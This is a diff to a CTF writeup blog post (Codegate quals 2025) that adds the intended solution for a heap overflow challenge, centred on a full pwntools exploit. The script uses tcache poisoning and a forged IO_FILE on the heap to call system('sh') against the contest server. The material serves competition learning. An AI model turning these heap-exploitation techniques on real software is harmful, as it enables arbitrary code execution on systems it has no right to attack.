@@ -1,5 +1,5 @@
 ---
-date: 2025-03-26 10:21:56
+date: 2025-03-29 10:21:56
 layout: post
 title: Unexpected heap primitive and unintended solve
 subtitle: codegate quals 2025 writeup
@@ -199,4 +199,210 @@ while(True):
         if cnt == 0:
             exit(0)
         continue
+```
+
+## todo list - intended solution
+not a difficult problem but a bit nasty.    
+
+The given vulnerability is a heap overflow of 15 bytes.   
+
+The leaking of the heap address is trivial, and the libc leak requires me to construct a fake big enough chunk and freeing it to put into unsorted bin.   
+
+Requires me 5 tcache poisoning attempts as below (so dirty!):
+1. set up the "footer" of the fake 0x460 big chunk
+2. set up the "footer" for the footer of the fake 0x460 big chunk, or it will crash when freeing the fake chunk
+3. get a chunk to the fake chunk's `size` field to edit it to normal(which is `p64(0) + p64(0x461)`) after the unsorted bin leak, or else the malloc operations afterwards will crash
+4. edit the _lock field of the fake IO_FILE on heap
+5. edit the IO_list_all to fake IO_FILE's address on heap    
+
+### exp
+```py
+from pwn import*
+context(os='linux', arch='amd64', log_level='debug')
+# p = process("./prob")
+p = remote("43.203.168.199",13379)
+libc = ELF("./libc.so.6")
+def create(idx,title,desc):
+    p.recvuntil("> ")
+    p.sendline("1")
+    p.recvuntil("Index: ")
+    p.sendline(str(idx))
+    p.recvuntil("Title: ")
+    p.send(title)
+    p.recvuntil("Desc : ")
+    p.send(desc)
+
+def edit(idx,desc):
+    p.recvuntil("> ")
+    p.sendline("2")
+    p.recvuntil("Index: ")
+    p.sendline(str(idx))
+    p.recvuntil("Desc : ")
+    p.send(desc)
+
+def show(idx):
+    p.recvuntil("> ")
+    p.sendline("3")
+    p.recvuntil("Index: ")
+    p.sendline(str(idx))
+
+def complete(idx):
+    p.recvuntil("> ")
+    p.sendline("4")
+    p.recvuntil("Index: ")
+    p.sendline(str(idx))
+
+def load(no,idx):
+    p.recvuntil("> ")
+    p.sendline("5")
+    p.recvuntil("No : ")
+    p.sendline(str(no))
+    p.recvuntil("Index: ")
+    p.sendline(str(idx))
+
+def delete(idx):
+    p.recvuntil("> ")
+    p.sendline("6")
+    p.recvuntil("Index: ")
+    p.sendline(str(idx))
+
+create(4,b"||"+b"a"*0xd,b"a"*0x10)
+create(2,b"||"+b"a"*0xd,b"a"*0x10)
+create(0,b"||"+b"a"*0xd,b"a"*0x11)
+create(1,b"a"*0xd,b"a"*0x18)
+complete(1) # normal no 0
+delete(1)
+complete(0) # overflow size no 1
+# gdb.attach(p,'''
+# b* $rebase(0x202c)
+# b* $rebase(0x209e)
+# b* $rebase(0x1e1b)
+# ''')
+# pause()
+load(1,0)
+show(0)
+# leak heap
+p.recvuntil("aaaaaaaaaaaaa||aaaaaaaaaaaaaaaaa")
+heap_base = u64(p.recv(5).ljust(8,b"\x00"))*0x1000
+log.info("heap_base: "+hex(heap_base))
+# leak libc tcache poisoning
+
+target_heap_addr = heap_base + 0x730 # todo
+fd = target_heap_addr ^ (heap_base//0x1000)
+edit(2,b"a"*0x11+p32(fd%0x100000000))
+delete(0)
+complete(2) # overwrite fd
+
+load(2,2)
+
+# 注意 create 全用的是 calloc
+load(0,0) # 0x2e0
+load(0,3)
+edit(3,p64(0)+p64(0x41))
+edit(4,b"a"*9+p64(0x461))
+complete(4)
+load(3,4)
+fd1 = (heap_base + 0x770) ^ (heap_base//0x1000)
+create(7,b"||"+b"a"*0xd,b"a"*0x11+p32(fd1%0x100000000))
+
+create(6,b"||"+b"a"*0xd,b"a"*0x10)
+create(5,b"||"+b"a"*0xd,b"a"*0x10)
+delete(5)
+delete(6)
+
+complete(7)
+
+load(4,7)
+load(0,5)
+load(0,6)
+edit(6,p64(0)+p64(0x41))
+fd2 = (heap_base + 0x2d0)^(heap_base//0x1000)
+
+# get a chunk to unsorted bin's size
+create(7,b"||"+b"a"*0xd,b"a"*0x11+p32(fd2%0x100000000))
+create(6,b"||"+b"a"*0xd,b"a"*0x10)
+create(5,b"||"+b"a"*0xd,b"a"*0x10)
+delete(5)
+delete(6)
+complete(7)
+load(5,7)
+load(0,5)
+load(0,6)
+edit(6,p64(0)+p64(0x461))
+
+
+delete(2) # trigger!
+complete(4)
+load(1,4)
+show(4)
+
+p.recvuntil("aaaaaaaaaaaaa||aaaaaaaaaaaaaaaaa")
+libc_leak = u64(p.recv(6).ljust(8,b"\x00"))
+log.info("libc_leak: "+hex(libc_leak))
+libc_base = libc_leak - 0x203b20
+log.info("libc_base: "+hex(libc_base))
+edit(6,p64(0)+p64(0x461))
+
+# construct io_file
+fake_io_addr = heap_base + 0x2f0
+b_addr = fake_io_addr + 0xd0 - 0x68
+system_addr = libc_base + libc.sym["system"]
+
+fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
+fake_io_file+=p64(0)*3+p64(1)+p64(2)
+fake_io_file=fake_io_file.ljust(0x30,b"\x00")
+fake_io_file+=p64(0)
+fake_io_file=fake_io_file.ljust(0x68,b"\x00")
+fake_io_file+=p64(system_addr)
+fake_io_file=fake_io_file.ljust(0x88,b"\x00")
+fake_io_file+=p64(libc_base+0x21ba60)
+fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
+fake_io_file+=p64(fake_io_addr)
+fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
+fake_io_file+=p64(0x215F58-0x40+libc_base) # 使得可以调用 _IO_wfile_overflow
+fake_io_file+=p64(fake_io_addr)
+create(0,b"a",p64(0)*2 + b"  sh;".ljust(0x8,b"\x00"))
+create(0,b"a",p64(0)+p64(0)+p64(2))
+create(0,b"a",p64(0)*3)
+create(0,b"a",p64(0)*3)
+create(0,b"a",p64(0)*3)
+create(0,b"a",p64(0)*2+p64(fake_io_addr))
+create(0,b"a",p64(0)*3)
+create(0,b"a",p64(system_addr)+p64(libc_base + 0x202228)+p64(b_addr))
+
+# modify fake_io_file + 0x80
+lock_ptr = fake_io_addr + 0x80
+fd4 = lock_ptr^(heap_base//0x1000)
+create(7,b"||"+b"a"*0xd,b"a"*0x11+p32(fd4%0x100000000))
+create(6,b"||"+b"a"*0xd,b"a"*0x10)
+create(5,b"||"+b"a"*0xd,b"a"*0x10)
+delete(5)
+delete(6)
+complete(7)
+load(7,7)
+load(0,5)
+load(0,6)
+edit(6,p64(0)+p64(libc_base + 0x205700))
+
+io_list_all = libc_base + 0x2044c0
+fd3 = io_list_all^(heap_base//0x1000)
+
+create(7,b"||"+b"a"*0xd,b"a"*0x11+p64(fd3)[:6])
+create(6,b"||"+b"a"*0xd,b"a"*0x10)
+create(5,b"a"*0xd,b"a"*0x8)
+
+complete(5)
+delete(6)
+complete(7)
+load(9,7)
+load(8,5)
+
+load(8,6)
+
+edit(6,p64(fake_io_addr))
+# trigger
+delete(10)
+
+p.interactive()
+# 想到一个不用打 IO_FILE 的方法：通过魔改 stdout 来 leak environ 然后打栈溢出，可以 mark 一下
 ```
